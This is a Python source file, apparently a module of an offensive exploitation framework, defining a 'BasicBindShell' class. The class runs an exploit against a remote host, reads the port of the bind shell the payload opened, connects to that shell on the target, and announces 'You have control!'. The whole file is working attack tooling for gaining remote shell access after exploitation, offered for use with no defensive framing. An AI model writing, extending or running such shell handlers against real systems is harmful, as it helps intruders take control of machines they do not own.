
import socket
import typing
from pytoolcore import style
from pytoolcore import netutils
from core import shellcore


class BasicBindShell(shellcore.AsynchronousBasicRemoteShell):

    AUTHOR: str = "Danakane"

    def __init__(self) -> None:
        shellcore.AsynchronousBasicRemoteShell.__init__(self)

    def initialize(self) -> None:
        self.exploit.run(self.rsockaddr)
        self.shellskt = socket.socket(self.protocol, socket.SOCK_STREAM)
        print(self.exploit.payload.optioninfo)
        bindport = int(self.exploit.payload.optioninfo)
        print(style.Style.info("Trying to connect to " + self.rhost))
        try:
            bindsockaddr = netutils.getsockaddr(self.rhost, bindport)
            self.shellskt.connect(bindsockaddr)
            print(style.Style.success("You have control! :)"))
        except (socket.error, socket.herror, socket.gaierror, socket.timeout) as err:
            print(style.Style.error(str(err)))
            print(style.Style.failure("Failed to connect :("))

blueprint: typing.Callable = BasicBindShell
